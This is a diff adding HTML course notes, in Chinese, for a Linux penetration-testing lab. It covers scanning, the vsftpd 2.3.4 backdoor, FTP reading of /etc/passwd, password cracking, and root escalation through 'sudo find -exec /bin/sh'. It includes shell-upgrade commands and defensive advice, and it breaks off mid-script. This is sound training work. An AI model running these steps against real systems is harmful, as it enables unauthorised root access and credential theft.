+                            <td>僅擁有者可訪問</td>
+                        </tr>
+                        <tr>
+                            <td>700</td>
+                            <td>rwx------</td>
+                            <td>僅擁有者可訪問且執行</td>
+                        </tr>
+                    </table>
+                </div>
+                
+                <h3>實戰技巧</h3>
+                
+                <h4>💡 技巧 1：grep 加速搜索</h4>
+                <div class="step">
+                    <strong>問題：</strong> linPEAS 輸出超過 10000 行，手動查找很困難<br>
+                    <strong>解決：</strong>
+                    <div class="command-box"><code>cat l.txt | grep NOPASSWD</code></div>
+                    <div class="note">或使用 less 搜索：<code>less l.txt</code> 然後按 <code>/NOPASSWD</code></div>
+                </div>
+                
+                <h4>💡 技巧 2：chmod 變更權限</h4>
+                <div class="step">
+                    <strong>給予執行權限：</strong>
+                    <div class="command-box"><code>chmod +x script.sh      # 新增執行權限
+chmod 755 script.sh     # 設定為 rwxr-xr-x
+chmod 644 file.txt      # 設定為 rw-r--r--</code></div>
+                </div>
+                
+                <h4>💡 技巧 3：檔案重定向</h4>
+                <div class="step">
+                    <strong>常用符號：</strong>
+                    <div class="command-box"><code>>     重定向（覆蓋）
+>>    追加（不覆蓋）
+2>&1  標準錯誤重定向到標準輸出
+/dev/null 黑洞（丟棄輸出）</code></div>
+                    <div class="note">例：<code>./script.sh 2>/dev/null | grep "重要" | tee output.txt</code></div>
+                </div>
+                
+                <h4>💡 技巧 4：管道與文本處理</h4>
+                <div class="step">
+                    <strong>常用組合：</strong>
+                    <div class="command-box"><code>cat file | grep "關鍵字"   尋找
+cat file | sort          排序
+cat file | uniq          去重
+cat file | head -20      取前 20 行
+cat file | tail -20      取後 20 行
+cat file | wc -l         統計行數</code></div>
+                </div>
+                
+                <h4>💡 技巧 5：SSH 連線快速輸入密碼</h4>
+                <div class="step">
+                    <strong>使用 sshpass：</strong>
+                    <div class="command-box"><code>sshpass -p 'letmein' ssh <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bbd9dad8d0dfd4d4c9fb8a8c8995888b958b95888f">[email&#160;protected]</a></code></div>
+                    <div class="warning-box">⚠️ 注意：不推薦在生產環境使用（密碼可見）</div>
+                </div>
+                
+                <h3>常見錯誤與解決</h3>
+                
+                <div class="warning-box">
+                    <strong>❌ 錯誤：</strong> ./linpeas.sh: 2297: lsmod: not found<br>
+                    <strong>✅ 原因：</strong> 容器環境缺少某些系統工具（正常）<br>
+                    <strong>✅ 解決：</strong> 結果仍然有效，查看紅色字標注的重點
+                </div>
+                
+                <div class="warning-box">
+                    <strong>❌ 錯誤：</strong> find: /proc/fs/selinux: Permission denied<br>
+                    <strong>✅ 原因：</strong> 某些目錄無讀取權限<br>
+                    <strong>✅ 解決：</strong> 無害，繼續執行
+                </div>
+                
+                <h3>安全防禦建議</h3>
+                
+                <div class="success-box">
+                    <strong>🛡️ 系統管理員視角</strong><br><br>
+                    <strong>1. 禁止 FTP 匿名登入</strong><br>
+                    編輯 vsftpd.conf，設定 <code>anonymous_enable=NO</code><br><br>
+                    
+                    <strong>2. 謹慎配置 Sudo</strong><br>
+                    避免 <code>NOPASSWD</code>，限制可執行命令<br><br>
+                    
+                    <strong>3. 監控系統掃描</strong><br>
+                    Nmap 大量掃描會觸發 IDS/IPS<br><br>
+                    
+                    <strong>4. 定期更新</strong><br>
+                    vsftpd 應更新至 ≥ 2.3.5<br><br>
+                    
+                    <strong>5. 使用強密碼</strong><br>
+                    避免簡單密碼，定期更換<br><br>
+                    
+                    <strong>6. 記錄審計</strong><br>
+                    監控 /var/log/auth.log 中的異常登入
+                </div>
+            </section>
+            
+            <!-- 完整滲透流程圖 -->
+            <section id="summary">
+                <h2>📊 完整滲透測試流程</h2>
+                
+                <div class="mermaid">
+                    graph TD
+                        A["🎯 目標<br/>172.30.0.34"]
+                        B["🔍 Phase 1: 掃描<br/>nmap -sV -sC"]
+                        C["發現 vsftpd 2.3.4<br/>FTP 開放"]
+                        D["💥 Phase 2: 利用<br/>觸發後門 Port 6200"]
+                        E["📁 Phase 3: FTP 匿名登入<br/>蒐集 /etc/passwd"]
+                        F["🔐 Phase 4: 密碼破解<br/>John the Ripper"]
+                        G["登入為 backdoor"]
+                        H["🚀 Phase 5: 權限提升<br/>linPEAS + find"]
+                        I["🎉 完成<br/>成為 Root<br/>獲得 Flag"]
+                        
+                        A --> B
+                        B --> C
+                        C --> D
+                        C --> E
+                        E --> F
+                        F --> G
+                        G --> H
+                        H --> I
+                        
+                        style A fill:#e74c3c,color:#fff
+                        style I fill:#27ae60,color:#fff
+                        style D fill:#f39c12,color:#fff
+                        style H fill:#f39c12,color:#fff
+                </div>
+                
+                <h3>時間線</h3>
+                <div class="table-container">
+                    <table>
+                        <tr>
+                            <th>階段</th>
+                            <th>時間</th>
+                            <th>目標</th>
+                            <th>成果</th>
+                        </tr>
+                        <tr>
+                            <td>掃描</td>
+                            <td>5 分鐘</td>
+                            <td>發現開放埠口和服務</td>
+                            <td>版本信息、NSE 腳本結果</td>
+                        </tr>
+                        <tr>
+                            <td>利用</td>
+                            <td>5 分鐘</td>
+                            <td>觸發後門獲得代碼執行</td>
+                            <td>Remote Shell (uid=1000)</td>
+                        </tr>
+                        <tr>
+                            <td>信息蒐集</td>
+                            <td>10 分鐘</td>
+                            <td>提取敏感文件</td>
+                            <td>/etc/passwd 密碼雜湊</td>
+                        </tr>
+                        <tr>
+                            <td>密碼破解</td>
+                            <td>2-5 秒</td>
+                            <td>破解雜湊獲得明文</td>
+                            <td>letmein (backdoor 帳號)</td>
+                        </tr>
+                        <tr>
+                            <td>權限提升</td>
+                            <td>10 分鐘</td>
+                            <td>成為 Root 用戶</td>
+                            <td>uid=0 root 權限</td>
+                        </tr>
+                        <tr>
+                            <td>獲取 Flag</td>
+                            <td>1 分鐘</td>
+                            <td>驗證完整控制</td>
+                            <td>kiwis{...}</td>
+                        </tr>
+                    </table>
+                </div>
+            </section>
+            
+            <!-- 進階資源 -->
+            <section id="resources">
+                <h2>📚 推薦學習資源</h2>
+                
+                <h3>官方文檔</h3>
+                <div class="concept-box">
+                    <strong>🔗 Nmap 官網：</strong> https://nmap.org/<br>
+                    <strong>🔗 GTFOBins：</strong> https://gtfobins.github.io/<br>
+                    <strong>🔗 HackTricks：</strong> https://book.hacktricks.wiki/<br>
+                    <strong>🔗 PEASS-ng：</strong> https://github.com/peass-ng/PEASS-ng
+                </div>
+                
+                <h3>後續課程建議</h3>
+                <div class="mermaid">
+                    graph LR
+                        A["Linux<br/>滲透測試<br/>✅ 完成"]
+                        B["Windows<br/>滲透測試"]
+                        C["Active Directory<br/>攻擊"]
+                        D["雲端安全<br/>AWS/Azure"]
+                        
+                        A --> B
+                        B --> C
+                        C --> D
+                        
+                        style A fill:#27ae60,color:#fff
+                        style B fill:#3498db
+                        style C fill:#3498db
+                        style D fill:#3498db
+                </div>
+                
+                <h3>實戰練習平台</h3>
+                <div class="tool-card">
+                    <h4>🏆 平台推薦</h4>
+                    <ul>
+                        <li><strong>HackTheBox：</strong> https://www.hackthebox.com/ - 專業滲透靶機</li>
+                        <li><strong>TryHackMe：</strong> https://tryhackme.com/ - 互動式教學</li>
+                        <li><strong>Vulnhub：</strong> https://www.vulnhub.com/ - 免費靶機下載</li>
+                        <li><strong>OWASP WebGoat：</strong> 網站安全學習</li>
+                        <li><strong>PortSwigger Web Security：</strong> 網站漏洞學習</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- ✅ 複習清單與常見問題 - 新增 -->
+            <section id="review-faq">
+                <h2>✅ 複習清單與常見問題</h2>
+                <p>如果你沒上到課，建議照著下面的 checklist 走一遍，確保每個段落都動手實作過。</p>
+
+                <h3>📋 必做複習清單（7 項）</h3>
+                <ul>
+                    <li>✓ 能從本機成功 SSH / PuTTY 連到 Jumpbox 與攻擊機</li>
+                    <li>✓ 會用 <code class="inline">nmap</code> 找出靶機有 FTP vsftpd 2.3.4 服務</li>
+                    <li>✓ 能匿名登入 FTP，讀取 /etc/passwd，找到可疑帳號與 hash</li>
+                    <li>✓ 會把 hash 寫成檔案，用 rockyou.txt + John the Ripper 破解密碼</li>
+                    <li>✓ 能用 SSH 登入 backdoor 使用者，並用 linpeas.sh 找到提權線索</li>
+                    <li>✓ 理解 sudo -l 輸出，並能查 GTFOBins 找對應提權方式</li>
+                    <li>✓ 成功使用 sudo find . -exec /bin/sh \; -quit 拿到 root 並讀到 proof.txt</li>
+                </ul>
+
+                <h3>🚀 延伸練習（3 個進階方向）</h3>
+                <div class="concept-box">
+                    <h4>1️⃣ 整理自己的 Cheat Sheet</h4>
+                    <p>把今天所有指令整理成你自己的快速參考表，或建立 bash alias 以加快操作。</p>
+                </div>
+
+                <div class="concept-box">
+                    <h4>2️⃣ 重複練習後門觸發流程</h4>
+                    <p>多試幾次 vsftpd 後門的觸發方式，熟悉 netcat 的使用和 6200 port 的 shell 連線。</p>
+                </div>
+
+                <div class="concept-box">
+                    <h4>3️⃣ 研究 linPEAS 輸出中的其他提權方式</h4>
+                    <p>不只有 sudo find，還有 Cron 定時任務、SUID 二進位、弱權限檔案、內核漏洞等提權向量。</p>
+                </div>
+
+                <h3>❓ 常見問題與解答 (FAQ)</h3>
+
+                <div class="hint-box">
+                    <h4>Q1: nmap 掃描一直卡住？</h4>
+                    <p><strong>A:</strong> 試試加上 <code class="inline">--max-rtt-timeout=3000ms</code> 或改用 <code class="inline">-Pn</code> 跳過 ping。</p>
+                </div>
+
+                <div class="hint-box">
+                    <h4>Q2: FTP 匿名登入說「530 Login incorrect」？</h4>
+                    <p><strong>A:</strong> FTP 伺服器可能關閉了匿名登入。試試用 curl 替代：<code class="inline">curl ftp://172.30.0.34/ -u anonymous:</code></p>
+                </div>
+
+                <div class="hint-box">
+                    <h4>Q3: John 破解沒有結果？</h4>
+                    <p><strong>A:</strong> 加上 <code class="inline">--verbose</code> 看即時進度，或用小字典快速測試。</p>
+                </div>
+
+                <div class="hint-box">
+                    <h4>Q4: sudo find 提權後 shell 功能有限？</h4>
+                    <p><strong>A:</strong> 試著升級 shell：<code class="inline">python -c "import pty; pty.spawn('/bin/bash')"</code></p>
+                </div>
+
+                <div class="hint-box">
+                    <h4>Q5: 如何確認拿到 root 權限？</h4>
+                    <p><strong>A:</strong> 執行 <code class="inline">id</code> 應顯示 uid=0(root)，並能 <code class="inline">cat /root/proof.txt</code></p>
+                </div>
+
+                <h3>🎯 關鍵概念總結</h3>
+                <p><strong>完整攻擊鏈：</strong> 資訊蒐集 → 密碼破解 → 後門利用 → 權限提升 → 拿到 Flag</p>
+            </section>
+        </div>
+        
+        <div class="footer">
+            <p>Linux 滲透測試訓練營 - 第三期課程筆記</p>
+            <p>講師：飛飛 | 機構：七維思股份有限公司 (Kiwis Security)</p>
+            <p style="margin-top: 10px; opacity: 0.8;">📧 <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6704080913060413270c0e100e141402044904080a">[email&#160;protected]</a> | 📞 台北市中正區忠孝西路一段72號二樓之5</p>
+        </div>
+    </div>
+    
+    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+        // 預設 IP 配置
+        const defaultConfig = {
+            attacker: '172.30.0.27',
+            target: '172.30.0.34',
+            jumpbox: 'dockerlab.feifei.tw:32835'
+        };
+        
+        // 初始化配置
+        function initIPConfig() {
+            const saved = localStorage.getItem('ipConfig');
+            if (saved) {
+                const config = JSON.parse(saved);
+                document.getElementById('attackerIP').value = config.attacker;
+                document.getElementById('targetIP').value = config.target;
+                document.getElementById('jumpboxIP').value = config.jumpbox;
+                updateAllIPs(config);
+            }
+        }
+        
+        // 保存 IP 配置
+        function saveIPConfig() {
+            const config = {
+                attacker: document.getElementById('attackerIP').value,
+                target: document.getElementById('targetIP').value,
+                jumpbox: document.getElementById('jumpboxIP').value
+            };
+            
+            // 驗證 IP 格式
+            if (!config.attacker || !config.target || !config.jumpbox) {
+                showStatus('❌ 請填入所有 IP 地址', false);
+                return;
+            }
+            
+            localStorage.setItem('ipConfig', JSON.stringify(config));
+            updateAllIPs(config);
+            showStatus('✅ 配置已保存！所有 IP 地址已更新', true);
+        }
+        
+        // 重設為預設值
+        function resetIPConfig() {
+            localStorage.removeItem('ipConfig');
+            document.getElementById('attackerIP').value = defaultConfig.attacker;
+            document.getElementById('targetIP').value = defaultConfig.target;
+            document.getElementById('jumpboxIP').value = defaultConfig.jumpbox;
+            updateAllIPs(defaultConfig);
+            showStatus('🔄 已恢復預設設定', true);
+        }
+        
+        // 更新所有 IP 地址
+        function updateAllIPs(config) {
+            const replacements = [
+                { old: '172.30.0.27', new: config.attacker, class: 'attacker-ip' },
+                { old: '172.30.0.34', new: config.target, class: 'target-ip' },
+                { old: 'dockerlab.feifei.tw:32835', new: config.jumpbox, class: 'jumpbox-ip' }
+            ];
+            
+            // 更新所有文字節點
+            const walker = document.createTreeWalker(
+                document.body,
+                NodeFilter.SHOW_TEXT,
+                null,
+                false
+            );
+            
+            let node;
+            const nodesToReplace = [];
+            
+            while (node = walker.nextNode()) {
+                replacements.forEach(replacement => {
+                    if (node.textContent.includes(replacement.old)) {
+                        nodesToReplace.push({
+                            node: node,
+                            old: replacement.old,
+                            new: replacement.new
+                        });
+                    }
+                });
+            }
+            
+            // 執行替換
+            nodesToReplace.forEach(item => {
+                item.node.textContent = item.node.textContent.replace(
+                    new RegExp(item.old.replace(/\./g, '\\.'), 'g'),
+                    item.new
+                );
+            });
+            
+            // 更新程式碼框中的內容
+            updateCodeBlocks(config);
+        }
+        
+        // 更新程式碼框
+        function updateCodeBlocks(config) {
+            const codeBlocks = document.querySelectorAll('.command-box code');
+            codeBlocks.forEach(block => {
+                let content = block.textContent;
+                content = content.replace(/172\.30\.0\.27/g, config.attacker);
+                content = content.replace(/172\.30\.0\.34/g, config.target);
+                content = content.replace(/dockerlab\.feifei\.tw:32835/g, config.jumpbox);
+                block.textContent = content;
+            });
+        }
+        
+        // 顯示狀態訊息
+        function showStatus(message, success) {
+            const status = document.getElementById('ip-status');
+            status.textContent = message;
+            status.classList.add('show');
+            if (success) {
